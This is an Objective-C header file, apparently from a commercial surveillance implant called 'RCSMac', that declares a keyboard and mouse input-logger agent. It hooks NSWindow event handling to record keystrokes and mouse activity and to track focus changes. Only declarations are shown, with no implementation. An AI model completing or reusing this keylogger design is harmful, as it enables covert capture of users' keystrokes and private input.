/*
 * RCSMac - Input Logger Agent (Mouse and Keyboard)
 * 
 * Created by Alfredo 'revenge' Pesoli on 12/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>

#define KEY_MAX_BUFFER_SIZE   0x10

extern int mouseAgentIsActive;
extern int keylogAgentIsActive;

typedef struct _mouseConfiguration {
  u_int width;
  u_int height;
} mouseStruct;


@interface NSWindow (inputLoggerHook)

//
// Left only for testing purposes
//
- (IMP)getImplementationOf: (SEL)lookup after: (IMP)skip;

- (void)hookKeyboardAndMouse: (NSEvent *)event;
- (void)logKeyboard: (NSEvent *)event;

- (void)logMouse;
//
// These are used in order to figure when the focus has been given/taken
// to/from the current process
//
- (void)resignKeyWindowHook;
- (void)becomeKeyWindowHook;

@end
